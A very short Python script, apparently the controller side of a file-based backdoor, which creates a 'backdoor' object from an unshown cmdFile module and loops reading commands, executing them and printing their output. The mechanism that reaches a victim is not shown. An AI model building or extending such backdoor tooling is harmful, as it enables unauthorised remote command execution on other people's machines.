# Author : WhiteOracle


from cmdFile import *


cc = cmdFile('backdoor')
while True:
    s = input(">>")
    cc.putCommand(s)
    cc.executeCommand()
    p = cc.getOutputFile()
    print(p)